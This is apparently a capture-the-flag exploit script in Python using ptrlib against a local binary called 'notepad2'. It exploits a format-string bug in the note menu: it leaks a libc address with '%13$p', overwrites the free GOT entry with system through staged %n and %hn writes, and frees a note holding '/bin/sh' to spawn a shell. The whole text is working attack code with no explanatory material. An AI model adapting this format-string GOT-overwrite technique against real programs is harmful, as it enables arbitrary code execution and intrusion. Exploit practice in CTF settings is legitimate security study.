from ptrlib import *

file = "./notepad2"
e = ELF(file)
libc = ELF("./libc.so.6")
sock = Process(file)
#sock = Socket("")
#sock.debug = True

"""
"""
def create_note(idx, content):
    print(f"[+] {content}")
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", idx)
    sock.sendlineafter("> ", content)

def view_note(idx):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", idx)
    return sock.recvline()

def remove_note(idx):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", idx)

def see_you():
    sock.sendlineafter("> ", "6")

create_note("0", "%13$p")
libc.base = int(view_note("0"), 16) - (libc.symbol("__libc_start_call_main")+0x80)
remove_note("0")


# free@got -> system
create_note("0", f'%{e.got("free")}c%8$n')
view_note("0")
remove_note("0")

create_note("0", f'%{libc.symbol("system")&0xffff}c%12$hn')
view_note("0")

create_note("1", f'%{e.got("free")+2}c%8$n')
view_note("1")

create_note("2", f'%{(libc.symbol("system") >> 16) & 0xffff}c%12$hn')
view_note("2")

create_note("3", b"/bin/sh")
remove_note("3")

sock.sh()

